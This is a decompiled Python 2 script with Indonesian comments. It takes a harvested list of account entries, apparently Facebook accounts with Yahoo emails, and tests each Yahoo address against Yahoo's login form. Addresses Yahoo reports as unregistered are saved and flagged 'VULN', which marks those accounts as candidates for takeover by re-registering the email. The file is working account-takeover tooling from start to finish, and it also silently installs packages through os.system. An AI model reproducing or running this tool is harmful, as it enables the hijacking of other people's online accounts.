# uncompyle6 version 3.3.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Apr 24 2019, 10:05:31) 
# [GCC 4.2.1 Compatible Android (5058415 based on r339409) Clang 8.0.2 (https://a
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

bgm = '\x1b[41m'
p = '\x1b[0m'
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def masuk():
    global toket
    #os.system('reset')
    
    #------------------------------
    noa = 1
    kun = []
    #LOOP, cari semua file *.bj (cookies) dalam dir....print all.
    for i in os.listdir(sys.path[0]):
        #klo file i = "*.bj"
        if "allm_" in i :
            # [1] 100003078072846.
            # [2] 100001014566278.
            print '  [' + str(noa) + '] ' + i[:-3]
            #append, masukkan nama file, dalam array list
            kun.append(i)
            #incr counter
            noa += 1

    #klo array tdk kosong
    if kun != []:
      #input nomer =plh
      plh = input('\n  [*] pilih akun yg mana = ')
      #Load FILE by number, from array list "kun[]"
      #cj.load(sys.path[0] + '/' + kun[plh - 1])
      #------------------------------
      #open replace for write
      try:
        os.mkdir('output')
      except OSError:
        pass
      save = open('output/Vuln'+i, 'w')
      #open for read only
      with open(kun[plh - 1]) as fp:  
       for cnt, line in enumerate(fp):
         #print("Line {}: {}".format(cnt, line))
         if "yahoo.com" in line.split(',')[0] :
          print line.split(',')[0].strip()
          berhasil = []
          try:
            mail = line.split(',')[0].strip()
            yahoo = re.compile('@.*')
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(line.strip() + '\n')
                print bgm + '[mVULN] ' + p + line
                berhasil.append(line.strip())
          except KeyError:
            pass

    print bgm + '------------------------------------'
    print '\[mDone.'
    print '\[+]Total : ' + str(len(berhasil))
    print '\[+]File saved: /output/Vuln'+i
    save.close()

if __name__ == '__main__':
    masuk()

